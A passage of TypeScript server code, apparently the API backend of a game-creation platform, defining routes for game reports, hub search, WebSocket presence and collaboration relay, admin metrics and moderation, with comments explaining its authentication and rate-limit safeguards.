      parentSlug: published.publishSlug,
    });
  });

  app.post('/v1/hub/games/:slug/report', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published) {
      return reply.code(404).send({ error: 'not_found' });
    }
    // Auth is optional for reports, but the reporter id must come from the
    // authenticated session — NEVER from a client-supplied ?userId (#44), which
    // let anyone attribute a report to any user. Authenticate from headers only.
    const user = await deps.auth.authenticate(req.headers);

    const body = (req.body ?? {}) as { reason?: unknown };
    // Cap reason length (#44) to bound stored size / abuse.
    const reason = typeof body.reason === 'string' ? body.reason.slice(0, 500) : undefined;

    // Light per-reporter / per-IP throttle so the report queue can't be flooded.
    const throttleKey = `report:${user?.userId ?? req.ip ?? 'anon'}`;
    if (!checkAuthRateLimit(throttleKey)) {
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: AUTH_WINDOW_MS });
    }

    await deps.hubRepo.addReport({
      targetType: 'published_game',
      targetId: published.id,
      ...(user !== null ? { reporterId: user.userId } : {}),
      ...(reason !== undefined ? { reason } : {}),
    });
    return reply.code(202).send({ ok: true });
  });

  // ── Hub search ────────────────────────────────────────────────────────────

  app.get('/v1/hub/search', async (req, reply) => {
    if (!deps.hubRepo || !deps.publishRepo) {
      return reply.code(503).send({ error: 'hub_unavailable' });
    }
    const { q, limit: limitStr } = req.query as Record<string, string | undefined>;
    if (!q || q.trim() === '') {
      return reply.code(400).send({ error: 'q_required' });
    }
    const limit = Math.min(Number(limitStr ?? '20'), 50);
    let embedding: number[] | undefined;
    if (deps.embedText) {
      try {
        embedding = await deps.embedText(q.trim());
      } catch {
        // Fall through to text search if embedding fails.
      }
    }
    const results = await deps.hubRepo.search({
      query: q.trim(),
      limit,
      ...(embedding !== undefined ? { embedding } : {}),
    });
    return reply.send({ results });
  });

  app.after(() => {
    // ── WebSocket co-presence ───────────────────────────────────────────────

    app.get('/v1/projects/:id/presence', { websocket: true }, async (first, second) => {
      const args = websocketArgs(first, second);
      if (!args) return;
      const { socket, req } = args;
      const id = projectIdFromSocketRequest(req, 'presence');
      if (!id) {
        socket.close(1008, 'invalid_project');
        return;
      }
      // Authenticate + ownership-check before joining the room. Without this, anyone
      // who guesses a projectId could enumerate presence on a victim's project.
      if (!(await authorizeProjectSocket(socket, req, id))) return;
      let sockets = presenceSockets.get(id);
      if (!sockets) {
        sockets = new Set();
        presenceSockets.set(id, sockets);
      }

      const send = (msg: string) => {
        try {
          socket.send(msg);
        } catch {
          /* disconnected */
        }
      };
      sockets.add(send);

      const broadcast = () => {
        const count = presenceSockets.get(id)?.size ?? 0;
        const msg = JSON.stringify({ type: 'presence', projectId: id, count });
        for (const fn of presenceSockets.get(id) ?? []) fn(msg);
      };

      broadcast();

      socket.on('close', () => {
        presenceSockets.get(id)?.delete(send);
        if (presenceSockets.get(id)?.size === 0) presenceSockets.delete(id);
        broadcast();
      });
    });

    // ── CRDT collab relay — GET /v1/projects/:id/collab (WebSocket) ─────────
    // Pure binary relay: every message from peer A is forwarded to all other peers
    // in the same project room. Clients run yjs + WebsocketProvider pointed here.
    // No server-side Y.Doc; late-joiners get state from existing peers via the
    // standard y-websocket sync step1/step2 protocol, which clients handle natively.
    app.get('/v1/projects/:id/collab', { websocket: true }, async (first, second) => {
      const args = websocketArgs(first, second);
      if (!args) return;
      const { socket, req } = args;
      const id = projectIdFromSocketRequest(req, 'collab');
      if (!id) {
        socket.close(1008, 'invalid_project');
        return;
      }
      // Authenticate + ownership-check before relaying. Without this, anyone who
      // guesses a projectId could inject arbitrary Yjs updates into the live document.
      if (!(await authorizeProjectSocket(socket, req, id))) return;

      let room = collabRooms.get(id);
      if (!room) {
        room = new Set();
        collabRooms.set(id, room);
      }
      room.add(socket);

      socket.on('message', (data: Buffer | ArrayBuffer) => {
        const buf: Buffer = Buffer.isBuffer(data) ? data : Buffer.from(data as ArrayBuffer);
        for (const peer of collabRooms.get(id) ?? []) {
          if (peer !== socket && (peer.readyState as number) === 1 /* OPEN */) {
            try {
              (peer as { send(d: Buffer): void }).send(buf);
            } catch {
              /* disconnected */
            }
          }
        }
      });

      socket.on('close', () => {
        collabRooms.get(id)?.delete(socket);
        if (collabRooms.get(id)?.size === 0) collabRooms.delete(id);
      });
    });
  });

  // ── admin metrics (autoscaling signal) ────────────────────────────────────

  app.get('/v1/admin/metrics', async (req, reply) => {
    if (!requireAdmin(req, reply)) return;
    const presence: Record<string, number> = {};
    for (const [projectId, sockets] of presenceSockets) {
      presence[projectId] = sockets.size;
    }
    const [runStats, hubStats] = await Promise.all([
      deps.runRepo.getStats(),
      deps.hubRepo?.getStats?.() ?? Promise.resolve(null),
    ]);

    // Reliability signal (4.1): how many runs the stuck-run reaper hard-failed
    // (abort_kind = 'reaped'). A climbing reapedCount means worker crashes /
    // lost jobs are stranding runs — page on it. Needs the Db; 0 when unwired.
    let reapedCount = 0;
    if (deps.authDb) {
      const { schema: s } = await import('@playforge/db');
      const [row] = await deps.authDb
        .select({ count: drizzleSql<number>`count(*)::int` })
        .from(s.runs)
        // 'reaped' is the reaper-only abort_kind marker. The column is free text
        // typed as AbortKind for the agent-classified kinds; the reaper writes
        // 'reaped' via the same localized cast, so compare against the raw value.
        .where(drizzleSql`${s.runs.abortKind} = 'reaped'`);
      reapedCount = Number(row?.count ?? 0);
    }

    let queue: { waiting: number; active: number; delayed: number; failed: number } | null = null;
    if (deps.generateQueue) {
      const [waiting, active, delayed, failed] = await Promise.all([
        deps.generateQueue.getWaitingCount(),
        deps.generateQueue.getActiveCount(),
        deps.generateQueue.getDelayedCount(),
        deps.generateQueue.getFailedCount(),
      ]);
      queue = { waiting, active, delayed, failed };
    }

    return reply.send({
      runs: runStats,
      reapedCount,
      hub: hubStats,
      queue,
      presence,
      presenceProjects: presenceSockets.size,
      connectedSockets: [...presenceSockets.values()].reduce((n, s) => n + s.size, 0),
    });
  });

  // GET /v1/admin/queue-depth — lightweight autoscaling probe. Gated behind the
  // admin token (fails closed when unset): live queue backlog is an operational
  // signal that shouldn't be world-readable under an /admin/ path. The scraper
  // (KEDA / Fly.io) carries the ADMIN_TOKEN like any other admin caller. (auth H3)
  app.get('/v1/admin/queue-depth', async (req, reply) => {
    if (!requireAdmin(req, reply)) return;
    if (!deps.generateQueue) {
      return reply.send({ waiting: 0, active: 0, depth: 0 });
    }
    const [waiting, active] = await Promise.all([
      deps.generateQueue.getWaitingCount(),
      deps.generateQueue.getActiveCount(),
    ]);
    return reply.send({ waiting, active, depth: waiting + active });
  });

  // ── moderation (admin) ────────────────────────────────────────────────────

  app.post('/v1/admin/games/:slug/moderate', async (req, reply) => {
    if (!deps.publishRepo) {
      return reply.code(503).send({ error: 'publish_unavailable' });
    }
    // Admin gate fails CLOSED (503) when no ADMIN_TOKEN is configured.
    if (!requireAdmin(req, reply)) return;
    const { slug } = req.params as { slug: string };
    const published = await deps.publishRepo.getBySlug(slug);
    if (!published) {
      return reply.code(404).send({ error: 'not_found' });
    }
    const VALID_STATUSES = ['live', 'unpublished', 'removed_by_mod'] as const;
    type Status = (typeof VALID_STATUSES)[number];
    const body = (req.body ?? {}) as { status?: unknown };
    if (!VALID_STATUSES.includes(body.status as Status)) {
      return reply.code(400).send({ error: 'invalid_status', valid: VALID_STATUSES });
    }
    await deps.publishRepo.setStatus(published.id, body.status as Status);
    return reply.code(200).send({ ok: true, slug, status: body.status });
  });

  return app;
}
